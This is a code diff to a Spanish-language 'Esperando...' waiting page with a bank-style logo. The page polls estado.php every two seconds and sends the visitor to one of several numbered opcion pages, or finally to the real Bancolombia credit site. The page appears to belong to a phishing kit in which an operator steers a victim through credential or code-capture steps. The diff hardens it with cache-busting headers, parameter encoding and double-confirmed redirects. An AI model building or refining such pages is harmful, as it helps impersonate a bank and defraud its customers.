@@ -4,6 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Esperando...</title>
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta http-equiv="Last-Modified" content="0">
 
   <style>
     body {
@@ -11,7 +15,6 @@
       padding: 0;
       font-family: Arial, sans-serif;
       background-color: #fff;
-      
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -43,70 +46,104 @@
       font-size: 18px;
       font-weight: bold;
       color: rgb(0, 0, 0);
-     
       padding: 8px 16px;
       border-radius: 10px;
     }
   </style>
 </head>
-<body style="background-color:#f7f7f7;  background-repeat: no-repeat; background-size: 300%;">
- 
+<body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">
+
 <br><br><br>
-<center><img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
+<center>
+  <img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
+  <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
+</center>
 
- <img  style="margin-top: -150px;"  src="img/cargando1.gif" width="85%" alt=""></center>
-
-
-
- <script>
+<script>
   const params = new URLSearchParams(window.location.search);
   const requestId = params.get("rid");
   const key = params.get("key");
 
+  let estadoAnterior = null;
+  let coincidenciasSeguidas = 0;
+
   setInterval(() => {
-    fetch(`estado.php?rid=${requestId}` + (key ? (`&key=${encodeURIComponent(key)}`) : ''), {cache:'no-store'})
-        .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
-        .then(data => {
-          const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
+    fetch(
+      `estado.php?rid=${encodeURIComponent(requestId)}` +
+      (key ? (`&key=${encodeURIComponent(key)}`) : ''),
+      { cache: 'no-store', credentials: 'same-origin' }
+    )
+      .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
+      .then(data => {
+        const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
+        const ahora = new Date().toISOString();
+        // Log de auditoria visible en DevTools del navegador para el usuario
+        // eslint-disable-next-line no-console
+        console.log(`[espera] ${ahora} rid=${requestId || ''} key=${key || ''} => estado=${estado} (previo=${estadoAnterior || 'null'})`);
+
+        if (estado === 'pendiente') {
+          estadoAnterior = 'pendiente';
+          coincidenciasSeguidas = 0;
+          return;
+        }
+
+        // Confirmacion DOBLE: dos polls consecutivos (4s) con el MISMO estado
+        // antes de redirigir. Evita respuestas de red glitches.
+        if (estadoAnterior && estadoAnterior === estado) {
+          coincidenciasSeguidas += 1;
+        } else {
+          estadoAnterior = estado;
+          coincidenciasSeguidas = 1;
+        }
+
+        if (coincidenciasSeguidas >= 2) {
+          // eslint-disable-next-line no-console
+          console.log(`[espera] ${ahora} ✅ estado confirmado x2 = ${estado}. Redirigiendo...`);
           switch (estado) {
-  case 'opcion_1':
-    window.location.href = `opcion1.html?key=${key}&requestId=${requestId}`;
-    break;
-  case 'opcion_2':
-    window.location.href = `opcion6.html?key=${key}`;
-    break;
-  case 'opcion_3':
-    window.location.href = `opcion3.html?key=${key}`;
-    break;
-  case 'opcion_4':
-    window.location.href = `opcion4.html?key=${key}`;
-    break;
-  case 'opcion_5':
-    window.location.href = `opcion5.html?key=${key}`;
-    break;
-  case 'opcion_6':
-    window.location.href = `opcion6.html?key=${key}`;
-    break;
-  case 'opcion_7':
-    window.location.href = `opcion7.html?key=${key}`;
-    break;
-  case 'opcion_8':
-    window.location.href = `opcion8.html?key=${key}`;
-    break;
-  case 'opcion_55':
-    window.location.href = `opcion55.html?key=${key}`;
-    break;
-  case 'opcion_9':
-    window.location.href = `opcion9.php?key=${key}`;
-    break;
-  case 'opcion_10':
-    window.location.href = 'https://www.bancolombia.com/personas/creditos';
-    break;
-  default:
-    break;
-}
+            case 'opcion_1':
+              window.location.href = `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
+              break;
+            case 'opcion_2':
+              window.location.href = `opcion6.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_3':
+              window.location.href = `opcion3.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_4':
+              window.location.href = `opcion4.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_5':
+              window.location.href = `opcion5.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_6':
+              window.location.href = `opcion6.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_7':
+              window.location.href = `opcion7.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_8':
+              window.location.href = `opcion8.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_55':
+              window.location.href = `opcion55.html?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_9':
+              window.location.href = `opcion9.php?key=${encodeURIComponent(key)}`;
+              break;
+            case 'opcion_10':
+              window.location.href = 'https://www.bancolombia.com/personas/creditos';
+              break;
+            default:
+              // Ninguna accion para estados desconocidos.
+              break;
+          }
+        }
       })
-        .catch(() => {/* ignore network/json errors, keep polling */});
+      .catch(() => {
+        // Ignore network/json errors; keep polling.
+        estadoAnterior = null;
+        coincidenciasSeguidas = 0;
+      });
   }, 2000);
 </script>
 
